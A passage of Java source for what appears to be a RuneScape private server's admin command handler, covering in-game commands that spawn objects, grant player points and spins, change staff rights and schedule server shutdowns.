package com.rs.game.player.content;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.NumberFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.TimerTask;
import org.runetoplist.VoteReward;
import com.rs.utils.Censor;
import com.rs.Launcher;
import com.rs.Settings;
import com.rs.cache.loaders.AnimationDefinitions;
import com.rs.cache.loaders.ItemDefinitions;
import com.rs.cache.loaders.NPCDefinitions;
import com.rs.cache.loaders.ObjectDefinitions;
import com.rs.cores.CoresManager;
import com.rs.game.Animation;
import com.rs.game.ForceMovement;
import com.rs.game.ForceTalk;
import com.rs.game.Graphics;
import com.rs.game.Hit;
import com.rs.game.Hit.HitLook;
import com.rs.game.Region;
import com.rs.game.World;
import com.rs.game.WorldObject;
import com.rs.game.WorldTile;
import com.rs.game.item.Item;
import com.rs.game.item.ItemsContainer;
import com.rs.game.minigames.FightPits;
import com.rs.game.minigames.clanwars.ClanWars;
import com.rs.game.minigames.clanwars.WallHandler;
import com.rs.game.minigames.duel.DuelArena;
import com.rs.game.minigames.duel.DuelControler;
import com.rs.game.npc.NPC;
import com.rs.game.npc.others.Bork;
import com.rs.game.player.Player;
import com.rs.game.player.Skills;
import com.rs.game.player.actions.divination.HarvestWisp;
import com.rs.game.player.content.Notes.Note;
import com.rs.game.player.content.botanybay.BotanyBay;
import com.rs.game.player.content.clans.ClansManager;
import com.rs.game.player.content.construction.House;
import com.rs.game.player.content.dungeoneering.DungeonPartyManager;
import com.rs.game.player.content.magic.Magic;
import com.rs.game.player.content.pet.Pets;
import com.rs.game.player.controlers.FightCaves;
import com.rs.game.player.controlers.FightKiln;
import com.rs.game.player.controlers.InstancedBossControler.Instance;
import com.rs.game.player.controlers.PestInvasion;
import com.rs.game.player.controlers.Wilderness;
import com.rs.game.player.controlers.dung.RuneDungGame;
import com.rs.game.player.controlers.events.DeathEvent;
import com.rs.game.player.cutscenes.HomeCutScene;
import com.rs.game.player.dialogues.Dialogue;
import com.rs.game.player.quest.impl.HalloweenEvent;
import com.rs.game.tasks.WorldTask;
import com.rs.game.tasks.WorldTasksManager;
import com.rs.utils.DisplayNames;
import com.rs.utils.Donations;
import com.rs.utils.Encrypt;
import com.rs.utils.FileUtilities;
import com.rs.utils.IPBanL;
import com.rs.utils.NPCSpawns;
import com.rs.utils.PkRank;
import com.rs.utils.SerializableFilesManager;
import com.rs.utils.ShopsHandler;
import com.rs.utils.Utils;
import com.rs.utils.VoteManager;
import com.rs.game.player.LendingManager;

/*
 * doesnt let it be extended
 */
public final class Commands {

	/*
	 * all console commands only for admin, chat commands processed if they not
	 * processed by console
	 */

	/**
	 * returns if command was processed
	 */
	
	
	public static boolean processCommand(Player player, String command,
			boolean console, boolean clientCommand) {
		if (command.length() == 0) // if they used ::(nothing) theres no command
			return false;
		String[] cmd = command.toLowerCase().split(" ");
		if (cmd.length == 0)
			return false;
		if (player.getRights() >= 2
				&& processAdminCommand(player, cmd, console, clientCommand))
			return true;
		if (player.getRights() >= 1
				&& (processModCommand(player, cmd, console, clientCommand)
						|| processHeadModCommands(player, cmd, console, clientCommand)))
			return true;
		if ((player.isSupporter() || player.getRights() >= 1) && processSupportCommands(player, cmd, console, clientCommand))
			return true;
		if (Settings.ECONOMY) {
			player.getPackets().sendGameMessage("You can't use any commands in economy mode!");
			return true;
			
		}
		if (player.getControlerManager().getControler() instanceof DuelArena || player.getControlerManager().getControler() instanceof DuelControler) {
			player.getPackets().sendGameMessage("You can't use any commands in a duel!");
			return true;
		}
		return processNormalCommand(player, cmd, console, clientCommand);
	}

	/*
	 * extra parameters if you want to check them
	 */
	@SuppressWarnings("resource")
	public static boolean processAdminCommand(final Player player,
			String[] cmd, boolean console, boolean clientCommand) {
		if (clientCommand) {
			switch (cmd[0]) {
			case "tele":
				cmd = cmd[1].split(",");
				int plane = Integer.valueOf(cmd[0]);
				int x = Integer.valueOf(cmd[1]) << 6 | Integer.valueOf(cmd[3]);
				int y = Integer.valueOf(cmd[2]) << 6 | Integer.valueOf(cmd[4]);
				player.setNextWorldTile(new WorldTile(x, y, plane));
				return true;
			}
		} else {
			String name;
			Player target;
			WorldObject object;
			Player target1;
			switch (cmd[0]) {
			
			case "spawnzombies":
				ArrayList<WorldTile> locations = new ArrayList<WorldTile>();
				for (int x = player.getX() - 30; x < player.getX() + 30; x++) {
					for (int y = player.getY() - 30; y < player.getY() + 30; y++)
						locations.add(new WorldTile(x, y, 0));
				}
			for (WorldTile loc : locations) {
				if (!World.canMoveNPC(loc.getPlane(), loc.getX(),
						loc.getY(), 1))
					continue;
				World.spawnNPC(73, loc, -1, true, true);
			}
			return true;
			
			
			case "assassin":
				player.getInterfaceManager().sendAssassin();
			return true;
			
			case "moneypouch":
				player.sm(""+player.getMoneyInPouch()+"");
			return true;
			case "testfarming":
			player.getPackets().sendConfigByFile(710, 2);
			return true;
			case "task":
				player.sm("My current task is "+player.getAssassinsManager().getTask()+" number "+player.getAssassinsManager().getAmount()+" type "+player.getAssassinsManager().getGameMode()+".");
			return true;
			
			case "gettask":
				int mode = Integer.parseInt(cmd[1]);
				player.getAssassinsManager().getTask(mode);
			return true;
			
			case "resetassassin":
				player.getAssassinsManager().resetTask();
			return true;
			// divination starts \\
			case "divineruneore":
				WorldTasksManager.schedule(new WorldTask() {
				    int ticks;
				    @Override
				    public void run() {
					ticks++;
				if(ticks == 1){
					player.setNextAnimation(new Animation(21217));
					player.addFreezeDelay(2500);
					final WorldObject divinerune = new WorldObject(87290,10, 0, player.getX() + 1, player.getY(), player.getPlane()); // object spawning
					player.faceObject(divinerune); // forces player to face where he is putting the object
					World.spawnTemporaryObject(divinerune, 3000); // dont touch
				}
				if(ticks == 5){
					final WorldObject divinerunea = new WorldObject(87269,10, 0, player.getX() + 1, player.getY(), player.getPlane()); // object with animation that player will mine
					World.spawnTemporaryObject(divinerunea, 40000);	// time object will stay in miliseconds
					 stop();
							}
				    return;
				    }  
			}, 0, 0);	
		    return true;		
			case "divineadamore":	
				WorldTasksManager.schedule(new WorldTask() {
				    int ticks;
				    @Override
				    public void run() {
					ticks++;
				if(ticks == 1){
					player.setNextAnimation(new Animation(21217));
					player.addFreezeDelay(2500);
					final WorldObject divinerune = new WorldObject(87289,10, 0, player.getX() + 1, player.getY(), player.getPlane()); // object spawning
					player.faceObject(divinerune); // forces player to face where he is putting the object
					World.spawnTemporaryObject(divinerune, 3000); // dont touch
				}
				if(ticks == 5){
					final WorldObject divinerunea = new WorldObject(87268,10, 0, player.getX() + 1, player.getY(), player.getPlane()); // object with animation that player will mine
					World.spawnTemporaryObject(divinerunea, 40000);	// time object will stay in miliseconds
					 stop();
							}
				    return;
				    }  
			}, 0, 0);	
				return true;
			case "setrender":
			    player.renderId = 3516;
			    return true;
			   case "ren":
				   // player.getAppearence().setRenderEmote(player.renderId);
				    player.setNextGraphics(new Graphics(player.renderId));
				    player.sendMessage("RENDER: " +player.renderId);
				    player.renderId++;
				    return true;
			case "divinemithore":	
				WorldTasksManager.schedule(new WorldTask() {
				    int ticks;
				    @Override
				    public void run() {
					ticks++;
				if(ticks == 1){
					player.setNextAnimation(new Animation(21217));
					player.addFreezeDelay(2500);
					final WorldObject divinerune = new WorldObject(87288,10, 0, player.getX() + 1, player.getY(), player.getPlane()); // object spawning
					player.faceObject(divinerune); // forces player to face where he is putting the object
					World.spawnTemporaryObject(divinerune, 3000); // dont touch
				}
				if(ticks == 5){
					final WorldObject divinerunea = new WorldObject(87267,10, 0, player.getX() + 1, player.getY(), player.getPlane()); // object with animation that player will mine
					World.spawnTemporaryObject(divinerunea, 40000);	// time object will stay in miliseconds
					 stop();
							}
				    return;
				    }  
			}, 0, 0);	
				return true;
			case "divinecoalore":	
				WorldTasksManager.schedule(new WorldTask() {
				    int ticks;
				    @Override
				    public void run() {
					ticks++;
				if(ticks == 1){
					player.setNextAnimation(new Animation(21217));
					player.addFreezeDelay(2500);
					final WorldObject divinerune = new WorldObject(87287,10, 0, player.getX() + 1, player.getY(), player.getPlane()); // object spawning
					player.faceObject(divinerune); // forces player to face where he is putting the object
					World.spawnTemporaryObject(divinerune, 3000); // dont touch
				}
				if(ticks == 5){
					final WorldObject divinerunea = new WorldObject(87266,10, 0, player.getX() + 1, player.getY(), player.getPlane()); // object with animation that player will mine
					World.spawnTemporaryObject(divinerunea, 40000);	// time object will stay in miliseconds
					 stop();
							}
				    return;
				    }  
			}, 0, 0);	
				return true;
			case "divineironore":	
				WorldTasksManager.schedule(new WorldTask() {
				    int ticks;
				    @Override
				    public void run() {
					ticks++;
				if(ticks == 1){
					player.setNextAnimation(new Animation(21217));
					player.addFreezeDelay(2500);
					final WorldObject divinerune = new WorldObject(87286,10, 0, player.getX() + 1, player.getY(), player.getPlane()); // object spawning
					player.faceObject(divinerune); // forces player to face where he is putting the object
					World.spawnTemporaryObject(divinerune, 3000); // dont touch
				}
				if(ticks == 5){
					final WorldObject divinerunea = new WorldObject(57572,10, 0, player.getX() + 1, player.getY(), player.getPlane()); // object with animation that player will mine
					World.spawnTemporaryObject(divinerunea, 40000);	// time object will stay in miliseconds
					 stop();
							}
				    return;
				    }  
			}, 0, 0);	
				return true;
			case "divinebronzeore":	
				WorldTasksManager.schedule(new WorldTask() {
				    int ticks;
				    @Override
				    public void run() {
					ticks++;
				if(ticks == 1){
					player.setNextAnimation(new Animation(21217));
					player.addFreezeDelay(2500);
					final WorldObject divinerune = new WorldObject(87285,10, 0, player.getX() + 1, player.getY(), player.getPlane()); // object spawning
					player.faceObject(divinerune); // forces player to face where he is putting the object
					World.spawnTemporaryObject(divinerune, 3000); // dont touch
				}
				if(ticks == 5){
					final WorldObject divinerunea = new WorldObject(34107,10, 0, player.getX() + 1, player.getY(), player.getPlane()); // object with animation that player will mine
					World.spawnTemporaryObject(divinerunea, 40000);	// time object will stay in miliseconds
					 stop();
							}
				    return;
				    }  
			}, 0, 0);
				return true;
				// divination ends \\
			case "givespinsall":
			    int type = Integer.parseInt(cmd[1]);
			    if (type == 0) {
				World.sendWorldMessage("<img=7><col=ff0000>News: " + player.getDisplayName() + " has given everyone that's online " + cmd[2] + " earned spins!", false);
				for (Player p : World.getPlayers()) {
				    if (p == null || !p.isRunning())
					continue;
				    p.getSquealOfFortune().giveEarnedSpins(Integer.parseInt(cmd[2]));
				}
			    } else if (type == 1) {
				World.sendWorldMessage("<img=7><col=ff0000>News: " + player.getDisplayName() + " has given everyone that's online " + cmd[2] + " bought spins!", false);
				for (Player p : World.getPlayers()) {
				    if (p == null || !p.isRunning())
					continue;
				    p.getSquealOfFortune().giveBoughtSpins(Integer.parseInt(cmd[2]));
				}
			    }
			    return true;
			case "dailytest":
				player.getSkillersManager().ADDNEWDAILY();
				player.getSkillersManager().ADDNEWDAILY();
				player.getSkillersManager().ADDNEWDAILY();
				return true;
			case "daily":
				player.getSkillersManager().ADDNEWDAILY();
		    	return true;
			case "dailyreset":
				player.hasdaily = false;
				player.dailyhasTask=false;
		    	player.getSkillersManager().resetTask();
		    	player.TASKID = -1;
		    	player.sendMessage("your daily task has been reset");
		    	return true;
			case "event":
				String event = cmd[0];
				if (cmd.length >= 2) {
						event = cmd[1];
					if (cmd.length == 3) {
						event = cmd[1] + " " + cmd[2];
					}
					if (cmd.length == 4) {
						event = cmd[1] + " " + cmd[2] + " " + cmd[3];
					}
					if (cmd.length == 5) {
						event = cmd[1] + " " + cmd[2] + " " + cmd[3] + " " + cmd[4];
					}
					if (cmd.length == 6) {
						event = cmd[1] + " " + cmd[2] + " " + cmd[3] + " " + cmd[4] + " " + cmd[5];
					}
					if (cmd.length == 7) {
						event = cmd[1] + " " + cmd[2] + " " + cmd[3] + " " + cmd[4] + " " + cmd[5] + " " + cmd[6];
					}
					ClansManager.clanEvent(event, player);
				}
				return true;
			
			case "cc":
				player.getPackets().sendJoinClanChat(player.getDisplayName(), "Noszscape");
				return true;
				
			case "bankpin":
			    player.getBank().openPin();
			    player.getTemporaryAttributtes().put("recovering_pin", true);
			    return true;
				
			case "customizeclancape":
				ClanCapeCustomizer.startCustomizing(player);
				return true;

			case "clancapecolor":
				player.setClanCapeCustomized(new int[] { Integer.valueOf(cmd[1]), Integer.valueOf(cmd[2]), Integer.valueOf(cmd[3]), Integer.valueOf(cmd[4]) });
				player.getAppearence().generateAppearenceData();
				return true;

			case "clancapetex":
				if (Integer.valueOf(cmd[1]) < 2320) {
					player.setClanCapeSymbols(new int[] { Integer.valueOf(cmd[1]), Integer.valueOf(cmd[2]) });
					player.getAppearence().generateAppearenceData();
				} else {
					player.getPackets().sendGameMessage("Max shit is 2320.");
				}
				return true;

				
			case "resetquests":
				player.SOWQUEST = 0;
				player.sm("You have reset your quests.");
				return true;
				
			case "history":
				//player.grandExchange().sendHistoryInterface(player);
				return true;
				
			case "eviltree":
				World.startEvilTree();
				return true;
				
			case "noszcount":
				player.sendMessage("Armadyl Kill Count: "+player.armadyl+"");
				player.sendMessage("Bandos Kill Count: "+player.bandos+"");
				player.sendMessage("Saradomin Kill Count: "+player.saradomin+"");
				player.sendMessage("Zamorak Kill Count: "+player.zamorak+"");
				return true;
				
				
			case "removetokens":
				player.setWGuildTokens((player.getWGuildTokens() - 10));
				player.sendMessage("You lost 10 Tokens");
				return true;
				
				
			case "wguild":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return false;
				}
				player.getControlerManager().startControler("WGuildControler");
				return true;
				
			case "newtut":
				player.getDialogueManager().startDialogue("NewPlayerTutorial");
				return true;
				
			case "closeinter":
				SpanStore.closeShop(player);
				return true;
			case "kbdin":
				player.getControlerManager().startControler("kbd");
				return true;
			case "giverspoints":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				player.RuneSpanPoints += 500;
				player.sm("You have been given 500 RuneSpan Points.");
				}
				return true;
				
			case "rspoints":
				player.sm("You have "+ player.RuneSpanPoints +" RuneSpan Points.");
				return true;
				
			/*case "pendant":
				player.sm("You have "+ player.getPendant().getSkill() +" at a rate of "+ player.getPendant().getModifier() +" also "+player.getPendant().hasAmulet()+".");
				return true;*/
						
			case "findstring":
			    final int value = Integer.valueOf(cmd[1]);
			    player.getInterfaceManager().sendInterface(Integer.valueOf(cmd[1]));
			    
			    WorldTasksManager.schedule(new WorldTask() {
			     int value2;
			     
			     @Override
			     public void run() {
			      player.getPackets().sendIComponentText(value, value2, "String " + value2);
			      player.getPackets().sendGameMessage("" + value2);
			      value2 += 1;
			     }
			    }, 0, 1/2);
			    return true;
				
			case "givespins":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					return true;
				other.getSquealOfFortune().setBoughtSpins(Integer.parseInt(cmd[2]));
				other.getPackets().sendGameMessage(
						"You have recived some spins!");
				}
				return true;
			case "dwarf":
				player.completedDwarfCannonQuest = true;
			return true;
			case "givetokens":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				int amount = Integer.parseInt(cmd[2]);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					return true;
				other.getInventory().addItem(29976, amount);
				other.getPackets().sendGameMessage(
						"You have recived some donator tokens!");
				}
				return true;
				
			case "dungtokens":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				player.setDungTokens(Integer.parseInt(cmd[1]));
				player.getPackets().sendGameMessage(
						"You now have "+player.getDungTokens()+" Dungeoneering Tokens!");
				}
				return true;
				
			case "givehorn":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					return true;
				other.horn = Integer.parseInt(cmd[2]);
				other.getPackets().sendGameMessage(
						"You have recived some horn charges!");
				}
				return true;
				
			case "givedpoints":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				String username1 = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other666669 = World.getPlayerByDisplayName(username1);
				if (other666669 == null)
					return true;
				other666669.setDonatorPoints(Integer.parseInt(cmd[2]));
				other666669.getPackets().sendGameMessage(
						"You have recived some Donator Points!");
				}
				return true;
			  case "dtaskother":
				    name = "";
				    for (int i = 1; i < cmd.length; i++)
				     name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				    target = World.getPlayerByDisplayName(name);
				    if(target == null)
				     player.getPackets().sendGameMessage(
				       "Couldn't find player " + name + ".");
				    else{
				     target.dhasTask = false;
				     target.damount = 0;
				                 return true;
				    }
				    return true;
			  case "checkxpwell":
				  if(World.wellActive = false) {
					  player.sendMessage("the well is not active");	  
				  } else {
					  player.sendMessage("the well is active");	  
				  }
			  return true;
			  case "resetxpwell":
				  //XPWell.setWellTask();
				  World.setWellActive(false);
				  World.resetWell();
				  Settings.XP_RATE = Settings.XP_RATE;
				  World.wellAmount = 0;
				 // XPWell.taskAmount = 7200000;
				 // XPWell.taskTime = 7200000;
				  return true;
			  case "xpwellamount":
				  player.sendMessage("Amount in the well is "+World.getWellAmount()+" gold.");
			  case "xpwelltime":
				  player.sendMessage("Time Left "+XPWell.taskAmount+" For double exp");
				  player.sendMessage("Time Left "+XPWell.taskTime+" For double exp");
				  return true;
				case "dailyresetother":
				    name = "";
				    for (int i = 1; i < cmd.length; i++)
				     name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				    target = World.getPlayerByDisplayName(name);
				    if(target == null)
				     player.getPackets().sendGameMessage(
				       "Couldn't find player " + name + ".");
				    else{
						target.hasdaily = false;
						target.dailyhasTask=false;
				    	target.getSkillersManager().resetTask();
				    	target.TASKID = -1;
				    	target.sendMessage("your daily task has been reset by "+ player.getUsername());
				    	player.sendMessage("You have reset "+ target.getUsername() + " daily task.");
				                 return true;
				    }
			    	return true;
			case "azuraspoints":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				String username1 = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other666669 = World.getPlayerByDisplayName(username1);
				if (other666669 == null)
					return true;
				//other666669.setkilledBy(Integer.parseInt(cmd[2]));
				//other666669.getPackets().sendGameMessage(
				//		"Your kills from  have been set to: " + player.killedBy + "");
				}
				return true;
				
			
				
			case "givefpoints":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				String username121 = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other6666691 = World.getPlayerByDisplayName(username121);
				if (other6666691 == null)
					return true;
				other6666691.setForumPoints(Integer.parseInt(cmd[2]));
				other6666691.getPackets().sendGameMessage(
						"You have recived some Forum Points!");
				}
				return true;
				
			case "giverpoints":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				String username12 = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other6666612 = World.getPlayerByDisplayName(username12);
				if (other6666612 == null)
					return true;
				other6666612.setRewardPoints(Integer.parseInt(cmd[2]));
				other6666612.getPackets().sendGameMessage(
						"You have recived some Reward Points!");
				}
				return true;
				
			case "findconfig":
			    final int configvalue = Integer.valueOf(cmd[1]);
			    player.getInterfaceManager().sendInterface(Integer.valueOf(cmd[1]));
			    
			    WorldTasksManager.schedule(new WorldTask() {
			     int value2;
			     
			     @Override
			     public void run() {
			      player.getPackets().sendConfig(1273, configvalue);//(configvalue, value2, "String " + value2);
			      player.getPackets().sendGameMessage("" + value2);
			      value2 += 1;
			     }
			    }, 0, 1/2);
			    return true;
			    
			case "findconfig2":
			    player.getInterfaceManager().sendInterface(Integer.valueOf(cmd[1]));
			    
			    WorldTasksManager.schedule(new WorldTask() {
			     int value2;
			     
			     @Override
			     public void run() {
			      player.getPackets().sendConfig(value2, 1);
			      player.getPackets().sendGameMessage("" + value2);
			      value2++;
			     }
			    }, 0, 1/2);
			    return true;
				
			case "sgar":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return false;
				}
				player.getControlerManager().startControler("SorceressGarden");
				return true;
			case "scg":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return false;
				}
				player.getControlerManager().startControler("StealingCreationsGame", true);
				return true;
			case "configsize":
				player.getPackets().sendGameMessage("Config definitions size: 2633, BConfig size: 1929.");
				return true;
			case "npcmask":
				for (NPC n : World.getNPCs()) {
					if (n != null && Utils.getDistance(player, n) < 9) {
						n.setNextForceTalk(new ForceTalk("Noszscape"));
					}
				}
				return true;
			case "runespan":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return false;
				}
				player.getControlerManager().startControler("RuneSpanControler");
				return true;
			case "qbd":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return false;
				}
				if (player.getSkills().getLevelForXp(Skills.SUMMONING) < 60) {
					player.getPackets().sendGameMessage("You need a summoning level of 60 to go through this portal.");
					player.getControlerManager().removeControlerWithoutCheck();
					return true;
				}
				player.lock();
				player.getControlerManager().startControler("QueenBlackDragonControler");
				return true;

			case "killingfields":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return false;
				}
				player.getControlerManager().startControler("KillingFields");
				return true;

			case "nntest":
				Dialogue.sendNPCDialogueNoContinue(player, 1, 9827, "Let's make things interesting!");
				return true;
			case "pptest":
				player.getDialogueManager().startDialogue("SimplePlayerMessage", "123");
				return true;
				
			case "achieve":
				player.getInterfaceManager().sendAchievementInterface();
				return true;

			case "debugobjects":
				System.out.println("Standing on " + World.getObject(player));
				Region r = World.getRegion(player.getRegionY() | (player.getRegionX() << 8));
				if (r == null) {
					player.getPackets().sendGameMessage("Region is null!");
					return true;
				}
				List<WorldObject> objects = r.getObjects();
				if (objects == null) {
					player.getPackets().sendGameMessage("Objects are null!");
					return true;
				}
				for (WorldObject o : objects) {
					if (o == null || !o.matches(player)) {
						continue;
					}
					System.out.println("Objects coords: "+o.getX()+ ", "+o.getY());
					System.out.println("[Object]: id=" + o.getId() + ", type=" + o.getType() + ", rot=" + o.getRotation() + ".");
				}
				return true;
			case "telesupport":
				for (Player staff : World.getPlayers()) {
					if (!staff.isSupporter())
						continue;
					staff.setNextWorldTile(player);
					staff.getPackets().sendGameMessage("You been teleported for a staff meeting by "+player.getDisplayName());
				}
				return true;
			case "telemods":
				for (Player staff : World.getPlayers()) {
					if (staff.getRights() != 1)
						continue;
					staff.setNextWorldTile(player);
					staff.getPackets().sendGameMessage("You been teleported for a staff meeting by "+player.getDisplayName());
				}
				return true;
			case "telestaff":
				for (Player staff : World.getPlayers()) {
					if (!staff.isSupporter() && staff.getRights() != 1)
						continue;
					staff.setNextWorldTile(player);
					staff.getPackets().sendGameMessage("You been teleported for a staff meeting by "+player.getDisplayName());
				}
				return true;
			case "pickuppet":
				if (player.getPet() != null) {
					player.getPet().pickup();
					return true;
				}
				player.getPackets().sendGameMessage("You do not have a pet to pickup!");
				return true;
			case "givemoderatorstatus":
				name = "";
				for (int i = 1; i < cmd.length; i++) {
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				}
				if (!player.getUsername().equalsIgnoreCase("99max99") || player.getUsername().equalsIgnoreCase("") || player.getUsername().equalsIgnoreCase("reddragon")) {
					return true;
				}
				target = World.getPlayerByDisplayName(name);
				boolean loggedIn = true;
				if (target == null) {
					target = SerializableFilesManager.loadPlayer(Utils.formatPlayerNameForProtocol(name));
					if (target != null) {
						target.setUsername(Utils.formatPlayerNameForProtocol(name));
					}
					loggedIn = false;
				}
				if (target == null) {
					return true;
				}
				target.setRights(1);
				SerializableFilesManager.savePlayer(target);
				if (loggedIn) {
					target.getPackets().sendGameMessage(
							"You have been promoted by " + Utils.formatPlayerNameForDisplay(player.getUsername()) + ".", true);
				}
				player.getPackets().sendGameMessage(
						"You have promoted " + Utils.formatPlayerNameForDisplay(target.getUsername()) + ".", true);
				return true; 

			/**case "update":
					int delay = 160;
					if (cmd.length >= 2)
						try {
							delay = Integer.valueOf(cmd[1]).intValue();
						} catch (NumberFormatException e) {
							player.getPackets().sendPanelBoxMessage(
									"Use: ::save secondsDelay(IntegerValue)");
							return true;
						}*
					World.safeShutdown(true, delay);
					Launcher.saveFiles();
					return true;*/
			case "updatepls":
				int delay = Integer.valueOf(cmd[1]);
				String reason = "";
				for (int i = 2; i < cmd.length; i++)
					reason += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				World.sendWorldMessage("<col=FF0000><img=7>Update: " + reason +"", false);
				if (delay > 60) {
					delay = 60;
				}
				if (delay < 15)
					delay = 15;
				World.safeShutdown(true, delay);
				Launcher.saveFiles();
			return true;
			
			case "setrights":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				if (player.getUsername().equalsIgnoreCase("99max99") || player.getUsername().equalsIgnoreCase("reddragon") || player.getUsername().equalsIgnoreCase("") || player.getUsername().equalsIgnoreCase("") || player.getUsername().equalsIgnoreCase("")) {
					String username2324 = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player other2324 = World.getPlayerByDisplayName(username2324);
					if (other2324 == null)
					return true;
					other2324.setRights(Integer.parseInt(cmd[2]));
					if (other2324.getRights() > 0) {
					other2324.out("Congratulations, You have been promoted to "+ (player.getRights() == 2 ? "Admin" : "Mod") +".");
					} else {
						other2324.out("Unfortunately you have been demoted.");
					}
					return true;
				}
				}
				return true;
			case "kbdinn":
				player.getControlerManager().startControler("KingBlackDragon");
				return true;
			case "vp": 
				if (!player.hasStaffPin) { 
					player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE); 
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"}); 
					} else { if (player.getUsername().equalsIgnoreCase("99max99") || player.getUsername().equalsIgnoreCase("reddragon")) { 
						player.playerpoints +=500;
						player.sendMessage("500 tokens added");
						} 
					} return true;	
			case "setmode":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				if (player.getUsername().equalsIgnoreCase("99max99") || player.getUsername().equalsIgnoreCase("reddragon")) {
					String username2324 = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player other2324 = World.getPlayerByDisplayName(username2324);
					if (other2324 == null)
					return true;
					other2324.setGameMode(Integer.parseInt(cmd[2]));
					if (other2324.getGameMode() == 0) {
					other2324.out("Your game mode has been set to: Standard");
					} else if (other2324.getGameMode() == 1) {
						other2324.out("Your game mode has been set to: Challenging");
					} else if (other2324.getGameMode() == 2) {
						other2324.out("Your game mode has been set to: Difficult");
					} else if (other2324.getGameMode() == 3) {
						other2324.out("Your game mode has been set to: Hardcore");
					}
					return true;
				}
				}
				return true;
			case "removeequipitems":
				File[] chars = new File("data/characters").listFiles();
				int[] itemIds = new int[cmd.length - 1];
				for (int i = 1; i < cmd.length; i++) {
					itemIds[i - 1] = Integer.parseInt(cmd[i]);
				}
				for (File acc : chars) {
					try {
